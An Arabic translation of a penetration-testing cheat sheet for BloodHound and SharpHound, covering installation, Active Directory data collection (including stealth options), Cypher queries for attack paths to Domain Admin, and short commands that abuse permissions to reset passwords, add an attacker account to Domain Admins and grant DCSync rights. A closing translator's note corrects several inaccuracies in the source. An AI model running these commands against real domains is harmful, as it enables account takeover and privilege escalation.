<a id="-bloodhound---active-directory-attack-path-visualization"></a>
# 🩸 BloodHound — تصوير مسارات الهجوم في Active Directory

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        AD Attack Path Visualization
```

يشير الرسم أعلاه إلى تصوير مسارات الهجوم في Active Directory، وقد حُفظ بتنسيقه الأصلي. تمثل العقد (Nodes) المستخدمين والأجهزة والمجموعات، وتمثل الحواف (Edges) العلاقات والصلاحيات بينها. وPrincipal كيان أمني قد يكون مستخدمًا أو مجموعة أو جهازًا.

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Attack Paths">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Graph">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو BloodHound؟](#-what-is-bloodhound)
- [التثبيت](#-installation)
- [جمع البيانات باستخدام SharpHound](#-sharphound-collection)
- [استخدام واجهة BloodHound الرسومية](#-using-bloodhound-gui)
- [الاستعلامات المدمجة](#-built-in-queries)
- [استعلامات Cypher مخصّصة](#-custom-cypher-queries)
- [تحليل مسارات الهجوم](#-attack-path-analysis)
- [BloodHound CE](#-bloodhound-ce)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-bloodhound"></a>
## 🎯 ما هو BloodHound؟

يستخدم **BloodHound** نظرية الرسوم البيانية لكشف مسارات الهجوم الخفية في Active Directory. ويعرض بصريًا:

- 🔗 **مسارات الهجوم** - مسارات الوصول إلى صلاحيات Domain Admin
- 👤 **علاقات المستخدمين** - عضويات المجموعات والجلسات
- 💻 **علاقات الثقة بالأجهزة** - الصلاحيات الإدارية والجلسات
- 🔓 **الإعدادات غير الآمنة** - أذونات قابلة للاستغلال
- 🎯 **أهداف عالية الأهمية** - حسابات حساسة

<a id="components"></a>
### المكوّنات

| المكوّن | الوصف |
|-----------|-------------|
| **BloodHound** | واجهة رسومية للتصوير (تعتمد على Neo4j) |
| **SharpHound** | جامع بيانات (.exe أو .ps1) |
| **Neo4j** | قاعدة بيانات للرسوم البيانية في الخلفية |
| **BloodHound CE** | إصدار سحابي/مؤسسي جديد |

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="kali-linux"></a>
### Kali Linux

```bash
# ثبّت BloodHound
sudo apt update
sudo apt install bloodhound

# ثبّت Neo4j
sudo apt install neo4j

# شغّل Neo4j
sudo neo4j start

# افتح واجهة Neo4j على: http://localhost:7474
# بيانات الاعتماد الافتراضية: neo4j / neo4j (غيّرها عند أول تسجيل دخول)

# شغّل BloodHound
bloodhound
```

<a id="windows"></a>
### Windows

```powershell
# نزّل من إصدارات GitHub
https://github.com/BloodHoundAD/BloodHound/releases

# ثبّت Neo4j Community Edition
https://neo4j.com/download/

# شغّل Neo4j
# شغّله كمسؤول وابدأ الخدمة

# شغّل BloodHound.exe
```

<a id="docker-recommended"></a>
### Docker (موصى به)

```bash
# Neo4j بإعداد ملائم لـ BloodHound
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# انتظر اكتمال البدء، ثم شغّل BloodHound
bloodhound
```

---

<a id="-sharphound-collection"></a>
## 📡 جمع البيانات باستخدام SharpHound

<a id="download-sharphound"></a>
### تنزيل SharpHound

```bash
# من إصدارات BloodHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# الملفات:
# - SharpHound.exe (مستقل)
# - SharpHound.ps1 (PowerShell)
```

<a id="basic-collection"></a>
### جمع البيانات الأساسي

```powershell
# شغّل SharpHound (افتراضيًا — جميع طرق الجمع)
.\SharpHound.exe

# حدّد النطاق
.\SharpHound.exe -d domain.local

# حدّد مكان الإخراج
.\SharpHound.exe -o C:\Temp\

# نسخة PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

<a id="collection-methods"></a>
### طرق جمع البيانات

```powershell
# جميع طرق جمع البيانات
.\SharpHound.exe -c All

# طرق محدّدة
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

<a id="collection-method-details"></a>
### تفاصيل طرق جمع البيانات

| الطريقة | الوصف | الأثر الملحوظ |
|--------|-------------|-------|
| Default | Group, LocalAdmin, Session, Trusts | منخفض |
| All | كل البيانات | مرتفع |
| Session | المستخدمون الذين سجّلوا الدخول | متوسط |
| LocalGroup | أعضاء المجموعات المحلية | متوسط |
| ACL | أذونات قوائم التحكم بالوصول (ACL) | منخفض |
| DCOnly | جمع من متحكم النطاق فقط | منخفض جدًا |
| Group | عضويات المجموعات | منخفض |
| Trusts | علاقات الثقة بين النطاقات | منخفض |

<a id="stealth-collection"></a>
### جمع البيانات بوضع Stealth

```powershell
# وضع Stealth (أبطأ وأقل أثرًا ملحوظًا)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# دون استعلامات حلّ أسماء DNS
.\SharpHound.exe --skipdns

# تأخير بين الطلبات
.\SharpHound.exe --throttle 1000
```

<a id="loop-collection-sessions"></a>
### جمع الجلسات دوريًا (Loop)

```powershell
# اجمع الجلسات بمرور الوقت
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# كرّر الجمع بفاصل زمني
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

<a id="from-linux-bloodhoundpy"></a>
### من Linux باستخدام bloodhound.py

```bash
# التثبيت
pip install bloodhound

# نفّذ جمع البيانات
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# باستخدام قيمة Hash
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

<a id="-using-bloodhound-gui"></a>
## 🖥️ استخدام واجهة BloodHound الرسومية

<a id="start-bloodhound"></a>
### تشغيل BloodHound

```bash
# 1. شغّل Neo4j
sudo neo4j start

# 2. انتظر Neo4j (تحقق من http://localhost:7474)

# 3. شغّل BloodHound
bloodhound

# 4. تسجيل الدخول
# URL: bolt://localhost:7687
# Username: neo4j
# كلمة المرور: (كلمة مرورك)
```

<a id="import-data"></a>
### استيراد البيانات

```
1. انقر على زر "Upload Data" (أيقونة المجلد)
2. اختر ملف .zip الناتج من SharpHound
3. انتظر اكتمال الاستيراد
4. تظهر البيانات في الرسم البياني
```

<a id="interface-overview"></a>
### نظرة على الواجهة

| القسم | الوصف |
|---------|-------------|
| **Search** | العثور على المستخدمين والأجهزة والمجموعات |
| **Analysis** | استعلامات جاهزة |
| **Filters** | إظهار الحواف والعقد أو إخفاؤها |
| **Graph** | تمثيل بصري |
| **Node Info** | تفاصيل العنصر المحدّد |

<a id="navigation"></a>
### التنقّل

```
- النقر بزر الفأرة الأيسر: تحديد عقدة
- النقر بزر الفأرة الأيمن: فتح قائمة السياق
- التمرير: التكبير والتصغير
- السحب: تحريك العرض
- Ctrl+Click: إضافة إلى التحديد
```

---

<a id="-built-in-queries"></a>
## 🔍 الاستعلامات المدمجة

<a id="domain-information"></a>
### معلومات النطاق

```
- Find all Domain Admins — العثور على جميع أعضاء Domain Admins
- Find all Domain Controllers — العثور على جميع متحكمات النطاق
- Find high value targets — العثور على الأهداف عالية الأهمية
- Map Domain Trusts — رسم علاقات الثقة بين النطاقات
```

<a id="shortest-paths"></a>
### أقصر المسارات

```
- Shortest Paths to Domain Admins — أقصر المسارات إلى Domain Admins
- Shortest Path from Owned Principals — أقصر مسار يبدأ من كيانات موسومة بأنها مخترقة
- Shortest Path to High Value Targets — أقصر مسار إلى أهداف عالية الأهمية
- Shortest Path to Unconstrained Delegation — أقصر مسار إلى التفويض غير المقيّد
```

<a id="kerberos"></a>
### Kerberos

```
- Find Kerberoastable Accounts — العثور على حسابات قابلة لهجوم Kerberoasting
- Find AS-REP Roastable Users — العثور على مستخدمين قابلين لهجوم AS-REP Roasting
- Shortest Path from Kerberoastable Users — أقصر مسار يبدأ من مستخدمين قابلين لـ Kerberoasting
- Find Principals with Unconstrained Delegation — العثور على كيانات ذات تفويض غير مقيّد
```

<a id="acl-analysis"></a>
### تحليل ACL

```
- Find Principals with DCSync Rights — العثور على كيانات تملك حقوق DCSync
- Find Dangerous Rights for Domain Users — العثور على حقوق خطرة لدى Domain Users
- Find Users with Foreign Domain Group Membership — العثور على مستخدمين أعضاء في مجموعات نطاقات أخرى
```

<a id="computers"></a>
### الأجهزة

```
- Find Computers with Unsupported OS — العثور على أجهزة ذات أنظمة تشغيل غير مدعومة
- Find Computers where Domain Users are Local Admin — العثور على أجهزة يكون Domain Users مسؤولين محليين عليها
- Find Computers with Sessions of High Value Users — العثور على أجهزة عليها جلسات لمستخدمين عاليي الأهمية
```

<a id="gpo"></a>
### GPO

```
- Find all GPO Owned by Owned Principals — العثور على جميع كائنات GPO المملوكة لكيانات موسومة بأنها مخترقة
- Find GPO Affecting High Value Targets — العثور على GPO المؤثرة في أهداف عالية الأهمية
```

---

<a id="-custom-cypher-queries"></a>
## 📝 استعلامات Cypher مخصّصة

<a id="basic-queries"></a>
### استعلامات أساسية

```cypher
// اعثر على جميع المستخدمين
MATCH (u:User) RETURN u

// اعثر على جميع الأجهزة
MATCH (c:Computer) RETURN c

// اعثر على جميع أعضاء Domain Admins
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// اعثر على جميع متحكمات النطاق
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

<a id="session-queries"></a>
### استعلامات الجلسات

```cypher
// اعثر على الأجهزة التي توجد عليها جلسات لأعضاء Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// اعثر على مستخدمين لديهم جلسات على عدة أجهزة
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

<a id="path-queries"></a>
### استعلامات المسارات

```cypher
// أقصر مسار إلى Domain Admin
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// جميع المسارات إلى Domain Admin (بحد أقصى 10)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// مسارات تبدأ من كيانات موسومة بأنها مخترقة
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

<a id="acl-queries"></a>
### استعلامات ACL

```cypher
// مستخدمون يملكون حقوق DCSync
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// مستخدمون يمكنهم إعادة تعيين كلمات المرور
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// مستخدمون يملكون GenericAll على الأجهزة
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

<a id="kerberos-queries"></a>
### استعلامات Kerberos

```cypher
// مستخدمون قابلون لـ Kerberoasting ولديهم مسار إلى DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// مستخدمون قابلون لهجوم AS-REP Roasting
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// أجهزة ذات تفويض غير مقيّد
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

<a id="high-value-targets"></a>
### أهداف عالية الأهمية

```cypher
// علّم الأهداف عالية الأهمية
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// اعثر على مسارات إلى أهداف عالية الأهمية
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

<a id="-attack-path-analysis"></a>
## 🎯 تحليل مسارات الهجوم

<a id="finding-attack-paths"></a>
### العثور على مسارات الهجوم

```
1. ابحث عن عقدة البداية (مستخدم مخترق)
2. انقر بزر الفأرة الأيمن ثم اختر "Mark as Owned"
3. شغّل الاستعلام: "Shortest Path from Owned Principals"
4. حلّل حواف المسار
```

<a id="common-attack-edges"></a>
### حواف هجوم شائعة

| الحافة | أسلوب الهجوم |
|------|---------------|
| **MemberOf** | عضوية مجموعة |
| **AdminTo** | صلاحيات مسؤول محلي |
| **HasSession** | استخراج بيانات الاعتماد |
| **CanRDP** | الوصول عبر RDP |
| **CanPSRemote** | الاتصال عن بُعد باستخدام PowerShell |
| **ExecuteDCOM** | التنفيذ باستخدام DCOM |
| **GenericAll** | تحكم كامل |
| **GenericWrite** | تعديل الكائن |
| **WriteOwner** | تغيير المالك |
| **WriteDacl** | تعديل ACL |
| **ForceChangePassword** | إعادة تعيين كلمة المرور |
| **AddMember** | إضافة إلى مجموعة |
| **AllExtendedRights** | DCSync وغيرها |
| **GetChanges** | DCSync (الجزء 1) |
| **GetChangesAll** | DCSync (الجزء 2) |

<a id="exploiting-attack-edges"></a>
### استغلال حواف الهجوم

<a id="genericall-on-user"></a>
#### صلاحية GenericAll على مستخدم

```powershell
# أعد تعيين كلمة المرور
net user targetuser NewP@ssw0rd /domain

# أو باستخدام PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

<a id="genericall-on-computer"></a>
#### صلاحية GenericAll على جهاز

```powershell
# هجوم التفويض المقيّد المعتمد على المورد (RBCD)
# استخدم Rubeus + PowerMad
```

<a id="forcechangepassword"></a>
#### ForceChangePassword

```powershell
# أعد تعيين كلمة المرور
net user targetuser NewP@ssw0rd /domain
```

<a id="addmember"></a>
#### AddMember

```powershell
# أضف مستخدمًا إلى مجموعة
net group "Domain Admins" attackeruser /add /domain

# أو باستخدام PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

<a id="writedacl"></a>
#### WriteDacl

```powershell
# أضف حقوق DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

<a id="-bloodhound-ce"></a>
## 🆕 BloodHound CE

<a id="about-bloodhound-ce"></a>
### حول BloodHound CE

**BloodHound Community Edition** هو الإصدار الجديد:
- واجهة ويب حديثة
- قاعدة PostgreSQL في الخلفية (وليست Neo4j)
- REST API
- أداء محسّن

<a id="installation"></a>
### التثبيت

```bash
# Docker Compose (موصى به)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# الوصول: http://localhost:8080
# الافتراضي: admin / (راجع سجلات docker)
```

<a id="sharphound-for-ce"></a>
### SharpHound المتوافق مع CE

```powershell
# نزّل جامعًا متوافقًا مع CE
# من إصدارات BloodHound CE

# نفّذ جمع البيانات (بالصياغة نفسها)
.\SharpHound.exe -c All
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="sharphound-commands"></a>
### أوامر SharpHound

| الأمر | الوصف |
|---------|-------------|
| `.\SharpHound.exe` | جمع البيانات الافتراضي |
| `.\SharpHound.exe -c All` | جميع الطرق |
| `.\SharpHound.exe -c DCOnly` | متحكم النطاق فقط (Stealth) |
| `.\SharpHound.exe -c Session --loop` | جمع الجلسات دوريًا |
| `.\SharpHound.exe -d domain.local` | تحديد النطاق |
| `.\SharpHound.exe --stealth` | وضع Stealth |

<a id="common-queries"></a>
### استعلامات شائعة

| الاستعلام | الغرض |
|-------|---------|
| Find all Domain Admins | تحديد أعضاء Domain Admins |
| Shortest Path to DA | العثور على مسار هجوم |
| Kerberoastable Users | العثور على SPNs قابلة للاستهداف بـ Kerberoasting |
| AS-REP Roastable | مستخدمون لا تتطلب حساباتهم المصادقة المسبقة |
| Unconstrained Delegation | استغلال التفويض |
| DCSync Rights | العثور على كيانات تملك حقوق DCSync |

<a id="analysis-workflow"></a>
### سير عمل التحليل

```
1. اجمع البيانات باستخدام SharpHound
2. استوردها إلى BloodHound
3. علّم الكيانات المخترقة
4. شغّل "Shortest Path from Owned"
5. حلّل حواف الهجوم
6. نفّذ الهجمات
7. علّم الكيانات الجديدة المخترقة
8. كرّر الخطوات
```

<a id="key-files"></a>
### ملفات أساسية

```
إخراج SharpHound:
- *_BloodHound.zip (بيانات JSON)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

<a id="-resources"></a>
## 📚 المراجع

- [مستودع BloodHound على GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [توثيق BloodHound](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [Mimikatz](../../Mimikatz/translations/README.ar.md)
- [PowerShell](../../PowerShell/translations/README.ar.md)
- [رفع الصلاحيات في Windows](../../Windows-PrivEsc/translations/README.ar.md)

---



> **Legacy وCommunity Edition:** يمزج المصدر واجهة BloodHound Legacy المكتبية مع BloodHound CE. إصدار CE مجتمعي مستقل عن BloodHound Enterprise، وليس مجرد إصدار سحابي؛ وتوضح البنية الرسمية وجود PostgreSQL لبيانات التطبيق وNeo4j لبيانات الرسم البياني، لذلك فعبارة «PostgreSQL وليست Neo4j» غير دقيقة. حُفظت العبارة وأوامر المصدر للتوثيق. راجع [المشروع الرسمي](https://github.com/SpecterOps/BloodHound) و[دليل CE الحالي](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)، الذي يستخدم BH-CLI لتنسيق النشر عبر Docker Compose.
>
> يجب توافق جامع البيانات مع إصدار BloodHound وصيغة الاستيراد. مثال pip الخاص بـ bloodhound-python يخص Legacy؛ يميّز [مشروع BloodHound.py](https://github.com/dirkjanm/BloodHound.py) بين هذا الفرع وبين CE. كما أن تشغيل SharpHound دون خيارات يستخدم Default وليس All؛ تختلف تفاصيل الطرق والأعلام بين الإصدارات، بما فيها أمثلة OutputDirectory وأسماء الطرق. يقلل DCOnly الاتصال بالأجهزة الأخرى، لكنه لا يعني جمعًا غير قابل للكشف؛ ويتطلب حل أسماء النطاق والصلاحيات المناسبة. راجع [أعلام SharpHound الرسمية](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags).
>
> الاستعلامات أمثلة من مخطط البيانات في المصدر؛ لا يُفترض توافق حقول owned/highvalue أو أسماء الاستعلامات المدمجة مع كل واجهة وإصدار. ويعدّ استعلام `SET u.highvalue = true` تعديلًا للبيانات، بخلاف استعلامات القراءة. ليس كل رابط في الرسم مسارًا قابلًا للاستغلال: يميّز BloodHound بين [الحواف القابلة وغير القابلة للعبور](https://bloodhound.specterops.io/resources/edges/traversable-edges). في النموذج الحديث لا تكفي GetChangesAll منفردة، بل تتكامل مع GetChanges لتكوين DCSync؛ راجع [GetChangesAll](https://bloodhound.specterops.io/resources/edges/get-changes-all).
>
> وجود HasSession يشير إلى جلسة رُصدت وقت الجمع، ولا يضمن بقاء الجلسة أو وجود بيانات اعتماد قابلة للاستخراج؛ وCanRDP لا يمنح تلقائيًا تنفيذًا بصلاحيات مرتفعة. تتطلب أمثلة الاستغلال وصولًا وصلاحيات فعلية وأدواتها الخارجية؛ فـ PowerView وPowerMad وRubeus ليست أوامر Windows مدمجة. راجع [HasSession](https://bloodhound.specterops.io/resources/edges/has-session) و[CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp). أُبقيت أسماء العقد والحواف والخصائص والقيم التقنية في الأمثلة دون ترجمة.

<p align="center">
  <b>🩸 اعثر على مسارك إلى صلاحيات Domain Admin!</b><br>
  <i>BloodHound — رفيق مختبِر اختراق Active Directory</i>
</p>
